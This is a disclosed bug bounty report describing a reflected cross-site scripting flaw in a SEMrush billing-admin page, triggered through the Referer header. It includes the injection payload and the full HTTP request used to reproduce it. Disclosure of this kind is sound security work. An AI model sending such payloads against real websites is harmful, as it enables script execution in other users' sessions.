# Reflected XSS using Header Injection

## Report Details
- **Report ID**: 297203
- **URL**: https://hackerone.com/reports/297203
- **State**: Closed
- **Severity**: low
- **Submitted**: 2017-12-12T07:56:28.475Z
- **Disclosed**: 2018-01-18T18:57:11.512Z

## Reporter
- **Username**: inferno-
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: semrush

## Vulnerability Information
Host : www.semrush.com

Path : /billing-admin/profile/subscription/?l=de

Payload : c5obc'+alert(1)+'p7yd5

Steps to reproduce :

Request Header :

GET /billing-admin/profile/subscription/?l=de HTTP/1.1
Host: www.semrush.com
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Referer: http://www.google.com/search?hl=en&q=c5obc'+alert(1)+'p7yd5

Overview :

The payload c5obc'+alert(1)+'p7yd5 was submitted in the Referer HTTP header. Payload is copied from a request and echoed into the application's immediate response in an unsafe way.

## Impact

Reflected cross-site scripting vulnerabilities arise when data is copied from a request and echoed into the application's immediate response in an unsafe way. An attacker can use the vulnerability to construct a request that, if issued by another application user, will cause JavaScript code supplied by the attacker to execute within the user's browser in the context of that user's session with the application.

## Attachments
- Semrush_XSS.png
- Semrush_Video_POC.mp4
